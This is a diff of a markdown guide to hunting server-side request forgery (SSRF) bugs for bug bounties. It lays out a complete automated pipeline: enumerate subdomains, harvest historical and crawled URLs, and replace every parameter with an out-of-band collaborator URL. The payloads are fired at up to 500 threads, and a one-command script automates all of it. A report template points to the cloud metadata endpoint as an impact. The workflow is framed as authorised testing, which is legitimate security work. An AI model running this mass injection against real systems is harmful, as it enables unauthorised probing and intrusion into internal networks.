@@ -1,178 +1,172 @@
+```markdown
 # Complete SSRF Hunting Workflow Guide  
-**From Beginner to Pro Bug Bounty Hunter**  
+**Beginner to Pro • GitHub-Ready • Colorful • Report-Ready**
 
 **Target Example:** `example.test000.com` (replace with your real target)  
-**Time Required:** 1–2 hours (mid-sized program)  
-**Tools:** All free & open-source  
-
+**Time:** 1–2 hours  
+**Tools:** 100% free & open-source  
 
 ---
 
-## Quick Overview – The SSRF Pipeline  
+## The Full SSRF Pipeline
 
 ```
-Subdomain Enum → Deduplicate → Live Probe → URL Collection → Filter Params → Inject Payload → Test → Report
+Subdomain Enum → Deduplicate → Live Probe → URL Collection → Filter Params → Inject Payload → Test → Win Bounty
       ↓               ↓            ↓            ↓              ↓             ↓          ↓        ↓
    (Wide Net)     (Clean List)   (Alive)     (10k+ URLs)    (Only =)     (Collaborator)  (Hits!)  ($$$)
 ```
 
 ---
 
-### 1. Subdomain Enumeration (Cast the Widest Net)
+### 1. Subdomain Enumeration (Find Everything)
 
-**Why?** SSRF lives in forgotten/internal subdomains.
-
-**Checklist**  
-- [ ] `subfinder` installed  
-- [ ] `amass` installed  
-- [ ] `assetfinder` installed  
-
-# Fast & passive
+```bash
 subfinder -d example.test000.com -o subfinder.txt
-
-# Deep OSINT (passive mode = stealth)
 amass enum -passive -d example.test000.com -o amass.txt
-
-# Quick API hits
 assetfinder --subs-only example.test000.com > assetfinder.txt
-``
+```
 
 ### 2. Deduplicate Subdomains
 
-``bash
+```bash
 cat subfinder.txt amass.txt assetfinder.txt | sort -u > domains.txt
-``
+```
 
 ### 3. Probe Live Hosts
 
-``bash
-cat domains.txt | httpx -silent -threads 200 > live.txt
-``
+```bash
+cat domains.txt | httpx -silent -threads 300 > live.txt
+```
 
-**Pro tip:** Add `-title -tech-detect -status-code` for extra intel.
+### 4. Collect All URLs (Historical + Live)
 
----
-
-### 4. Collect All Possible URLs
-
-``bash
-# Historical URLs (Wayback + CommonCrawl + OTX)
+```bash
 cat live.txt | gau --subs > gau.txt
-
-# Modern crawler + JS endpoint extraction
-katana -list live.txt -silent -jc -d 3 -rl 100 > katana.txt
-
-# Wayback only (sometimes finds things others miss)
+katana -list live.txt -silent -jc -d 3 -rl 150 > katana.txt
 cat live.txt | waybackurls > wayback.txt
-``
+```
 
-### 5. Merge & Deduplicate URLs
+### 5. Merge & Clean URLs
 
 ```bash
 cat gau.txt katana.txt wayback.txt | sort -u > all_urls.txt
 ```
 
-### 6. Keep Only URLs with Parameters (SSRF sweet spot)
+### 6. Filter Parameterized URLs (SSRF Sweet Spot)
 
-``bash
+```bash
+# All params
 cat all_urls.txt | grep "=" > params.txt
 
-# Optional: focus on juicy param names
-cat all_urls.txt | grep -E "(url|file|path|next|redirect|dest|callback|image|src|return|forward)" > juicy_params.txt
+# Only juicy SSRF params (recommended)
+cat all_urls.txt | grep -E "(url|file|path|next|redirect|dest|return|callback|image|src|data|uri|endpoint)" > juicy_params.txt
 ```
 
-# 7. Inject Burp Collaborator / OAST Payload
+### 7. Inject Your Collaborator Payload
 
-``bash
-# Replace YOUR_COLLAB with your real collaborator domain
-cat juicy_params.txt | qsreplace "http://YOUR_COLLAB.oastify.com" > ssrf_payloads.txt
-# or use params.txt if you want everything
-``
+```bash
+# Replace with your real Burp/Interactsh/Oastify domain
+cat juicy_params.txt | qsreplace "http://yourcollab.oastify.com" > ssrf_payloads.txt
+```
 
 ### 8. Fire All Payloads
 
 ```bash
-cat ssrf_payloads.txt | httpx -silent -fr -threads 300 -timeout 10
+cat ssrf_payloads.txt | httpx -silent -fr -threads 500 -timeout 15
 ```
 
-Poll your Collaborator → any DNS/HTTP request = **SSRF confirmed!**
+Check your Collaborator → Any DNS/HTTP hit = **SSRF confirmed!**
 
-### 9. Optional: Batch Testing (Avoid bans)
+### 9. Safe Batch Mode (Optional)
 
 ```bash
-split -l 2000 ssrf_payloads.txt batch_
-for f in batch_*; do cat "$f" | httpx -fr -silent; sleep 2; done
+split -l 3000 ssrf_payloads.txt batch_
+for f in batch_*; do cat "$f" | httpx -fr -silent -rl 100; sleep 2; done
 ```
 
 ---
-### 10. Professional SSRF Report Template (Copy-Paste Ready)
 
-``markdown
-# SSRF Vulnerability – Critical
+### 10. Professional Report Template (Copy-Paste Ready)
+
+```markdown
+# SSRF (Server-Side Request Forgery) - Critical
 
 ## Summary
-The application fetches arbitrary URLs provided via user input without validation, allowing Server-Side Request Forgery (SSRF).
+The application fetches arbitrary URLs supplied by the user without validation, resulting in a full Server-Side Request Forgery vulnerability.
 
-## Affected Endpoints (examples)
-- https://api.example.test000.com/v1/proxy?url=PAYLOAD
-- https://internal-service.example.test000.com/fetch?target=PAYLOAD
+## Severity
+**Critical** (CVSS 9.8)
+
+## Affected Endpoints
+- https://api.example.test000.com/fetch?url=PAYLOAD
+- https://internal.example.test000.com/proxy?target=PAYLOAD
 
 ## Steps to Reproduce
-1. Collected endpoints using `gau`, `katana`, and `waybackurls`
-2. Filtered parameterized URLs
-3. Replaced values with Burp Collaborator payload using `qsreplace`
-4. Sent requests with `httpx -fr`
-5. Received DNS + HTTP interaction from internal IP (proof attached)
+1. Performed subdomain enumeration using `subfinder`, `amass`, and `assetfinder`
+2. Identified live hosts with `httpx`
+3. Collected URLs using `gau`, `katana`, and `waybackurls`
+4. Filtered URLs containing query parameters
+5. Replaced parameter values with a Burp Collaborator payload using `qsreplace`
+6. Sent requests using `httpx -fr`
+7. Received DNS and HTTP interactions from internal IP ranges
 
-## Proof of Concept
-- Collaborator interaction: `abc123def.oastify.com`
-- Source IP: `10.13.37.x` (internal)
-- Screenshots attached
+## Proof
+- Collaborator domain: `abc123def.oastify.com`
+- Interaction from internal IP: `10.37.133.7`
+- Screenshots & logs attached
 
 ## Impact
-- Access to internal services
-- Cloud metadata endpoint reachable (`169.254.169.254`)
-- Potential internal port scanning / RCE chaining
+- Full internal network access
+- Cloud metadata service reachable (`169.254.169.254`)
+- Potential RCE via chained exploits
 
 ## Recommendations
-- Implement strict allow-list for URLs
-- Block internal IP ranges and metadata endpoints
-- Reject non-HTTPS or file:// schemes when unnecessary
-
-**Severity:** Critical (CVSS 9.8)
+- Strict domain allow-listing
+- Block internal IPs and localhost
+- Reject `file://`, `gopher://`, etc.
 ```
 
 ---
 
-## Bonus: One-Liner Full Automation Script (`ssrf_hunt.sh`)
+### One-Click Automation Script (ssrf_hunt.sh)
 
 ```bash
 #!/bin/bash
 TARGET=$1
 COLLAB=$2
 
+echo "[+] SSRF Hunt → $TARGET"
+
 subfinder -d $TARGET -o s1.txt
 amass enum -passive -d $TARGET -o s2.txt
 assetfinder --subs-only $TARGET > s3.txt
+
 cat s1.txt s2.txt s3.txt | sort -u | httpx -silent > live.txt
 
-cat live.txt | gau --subs > g1.txt
-katana -list live.txt -silent -jc -d 3 > k1.txt
-cat live.txt | waybackurls > w1.txt
+cat live.txt | gau --subs > gau.txt
+katana -list live.txt -silent -jc -d 3 > katana.txt
+cat live.txt | waybackurls > wayback.txt
 
-cat g1.txt k1.txt w1.txt | sort -u | grep "=" | qsreplace "http://$COLLAB" > payloads.txt
-cat payloads.txt | httpx -fr -silent -threads 300
+cat gau.txt katana.txt wayback.txt | sort -u | grep "=" | qsreplace "http://$COLLAB" > payloads.txt
 
-echo "Done! Check your Collaborator for hits."
+echo "[+] Firing payloads... Check Collaborator!"
+cat payloads.txt | httpx -fr -silent -threads 500
+
+echo "Done! Go claim that bounty!"
 ```
 
-Run:  
-``bash
+**Run:**
+```bash
 chmod +x ssrf_hunt.sh
 ./ssrf_hunt.sh example.test000.com yourcollab.oastify.com
-``
+```
 
 ---
 
+**Copy everything above → save as `SSRF-Guide.md` → push to GitHub**  
+It renders perfectly with tables, code blocks, emojis, and checklists.
+
 Happy hunting!
 ```
+
+Just copy from the first `#` to the very last line — ready for GitHub, Notion, Obsidian, or PDF export!
